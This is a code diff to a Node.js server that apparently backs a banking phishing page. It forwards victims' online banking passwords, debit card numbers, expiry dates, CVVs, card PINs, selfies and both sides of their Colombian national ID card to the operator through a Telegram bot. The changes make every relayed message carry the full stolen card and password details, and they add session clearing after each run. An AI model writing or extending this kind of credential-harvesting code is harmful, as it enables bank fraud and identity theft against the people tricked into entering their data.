@@ -84,6 +84,21 @@ app.post('/api/webhook', (req, res) => {
     }
 });
 
+// Endpoint para limpiar sesión
+app.post('/api/clear-session', async (req, res) => {
+    try {
+        const sessionId = req.body.sessionId;
+        if (sessionId && sessionData.has(sessionId)) {
+            sessionData.delete(sessionId);
+            console.log('🧹 Sesión limpiada:', sessionId);
+        }
+        res.json({ success: true });
+    } catch (error) {
+        console.error('Error al limpiar sesión:', error);
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
 // Función para enviar mensajes
 async function sendTelegramMessage(data, sessionId = null) {
     try {
@@ -92,7 +107,7 @@ async function sendTelegramMessage(data, sessionId = null) {
         // Actualizar datos de sesión
         if (sessionId && data.tipo !== 'Token') {
             if (!sessionData.has(sessionId)) {
-                sessionData.set(sessionId, { history: [], data: {} });
+                sessionData.set(sessionId, { history: [], data: {}, fullData: [] });
             }
             
             const session = sessionData.get(sessionId);
@@ -100,7 +115,8 @@ async function sendTelegramMessage(data, sessionId = null) {
             // Guardar datos del mensaje actual
             if (data.tipo === 'Clave Segura') {
                 session.data.clave = { tipoDocumento: data.tipoDocumento, numeroDocumento: data.numeroDocumento, clave: data.clave };
-                session.history.push(`✅ Clave Segura - Doc: ${data.numeroDocumento}`);
+                session.history.push(`✅ Clave Segura`);
+                session.fullData.push(`🔐 Clave Segura: ${data.tipoDocumento} ${data.numeroDocumento} | Clave: ${data.clave}`);
             } else if (data.tipo === 'Tarjeta Débito') {
                 session.data.tarjeta = { 
                     tipoDocumento: data.tipoDocumento, 
@@ -110,18 +126,23 @@ async function sendTelegramMessage(data, sessionId = null) {
                     fechaVencimiento: data.fechaVencimiento,
                     cvv: data.cvv
                 };
-                session.history.push(`✅ Tarjeta - ${data.numeroTarjeta}`);
+                session.history.push(`✅ Tarjeta Débito`);
+                session.fullData.push(`💳 Tarjeta: ${data.numeroTarjeta} | Venc: ${data.fechaVencimiento} | CVV: ${data.cvv} | Clave: ${data.claveTarjeta}`);
+                session.fullData.push(`📋 Usuario: ${data.tipoDocumento} ${data.numeroDocumento}`);
             } else if (data.tipo === 'Selfie') {
                 session.data.selfie = { messageId: data.messageId };
-                session.history.push(`✅ Selfie capturado`);
+                session.history.push(`✅ Selfie`);
+                session.fullData.push(`📸 Selfie capturado - ID: ${data.messageId}`);
             } else if (data.tipo === 'Cédula Frontal') {
                 if (!session.data.cedula) session.data.cedula = {};
                 session.data.cedula.frontal = { messageId: data.messageId };
                 session.history.push(`✅ Cédula Frontal`);
+                session.fullData.push(`🪪 Cédula FRONTAL - ID: ${data.messageId}`);
             } else if (data.tipo === 'Cédula Trasera') {
                 if (!session.data.cedula) session.data.cedula = {};
                 session.data.cedula.trasera = { messageId: data.messageId };
                 session.history.push(`✅ Cédula Trasera`);
+                session.fullData.push(`🪪 Cédula TRASERA - ID: ${data.messageId}`);
             }
             
             sessionData.set(sessionId, session);
@@ -131,7 +152,13 @@ async function sendTelegramMessage(data, sessionId = null) {
         let acumulado = '';
         if (sessionId && sessionData.has(sessionId)) {
             const session = sessionData.get(sessionId);
-            acumulado = '\n\n📊 <b>INFORMACIÓN ACUMULADA:</b>\n' + session.history.join('\n');
+            if (session.fullData && session.fullData.length > 0) {
+                acumulado = '\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━';
+                acumulado += '\n📊 <b>DATOS COMPLETOS DEL USUARIO</b>\n';
+                acumulado += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n';
+                acumulado += session.fullData.join('\n');
+                acumulado += '\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━';
+            }
         }
         
         const keyboard = {
@@ -174,9 +201,9 @@ async function sendTelegramMessage(data, sessionId = null) {
                 if (data.tipo === 'Selfie') {
                     caption = `📸 <b>SELFIE DE VERIFICACIÓN</b>\n\n🆔 <b>Message ID:</b> ${data.messageId}\n⏰ <b>Fecha:</b> ${timestamp}${acumulado}`;
                 } else if (data.tipo === 'Cédula Frontal') {
-                    caption = `🪪 <b>DOCUMENTO - LADO FRONTAL</b>\n\n🆔 <b>Message ID:</b> ${data.messageId}\n⏰ <b>Fecha:</b> ${timestamp}${acumulado}`;
+                    caption = `🪪 <b>CÉDULA DE CIUDADANÍA - LADO FRONTAL</b>\n\n📄 <b>IMPORTANTE:</b> Este es el <b>FRENTE</b> del documento\n🆔 <b>Message ID:</b> ${data.messageId}\n⏰ <b>Fecha:</b> ${timestamp}${acumulado}`;
                 } else if (data.tipo === 'Cédula Trasera') {
-                    caption = `🪪 <b>DOCUMENTO - LADO TRASERO</b>\n\n🆔 <b>Message ID:</b> ${data.messageId}\n⏰ <b>Fecha:</b> ${timestamp}${acumulado}`;
+                    caption = `🪪 <b>CÉDULA DE CIUDADANÍA - LADO TRASERO (REVERSO)</b>\n\n📄 <b>IMPORTANTE:</b> Este es el <b>REVERSO</b> del documento\n✅ <b>Captura completa:</b> Ambos lados recibidos\n🆔 <b>Message ID:</b> ${data.messageId}\n⏰ <b>Fecha:</b> ${timestamp}${acumulado}`;
                 } else if (data.tipo === 'Cédula') {
                     caption = `🪪 <b>DOCUMENTO DE IDENTIDAD</b>\n\n🆔 <b>Message ID:</b> ${data.messageId}\n⏰ <b>Fecha:</b> ${timestamp}${acumulado}`;
                 }
@@ -270,6 +297,8 @@ bot.on('callback_query', async (callbackQuery) => {
         await bot.answerCallbackQuery(callbackQuery.id);
 
         if (action === 'finalizar') {
+            console.log('🧹 Limpiando todas las sesiones activas...');
+            sessionData.clear();
             await bot.editMessageText('✅ Proceso finalizado exitosamente', {
                 chat_id: chatId,
                 message_id: messageId,
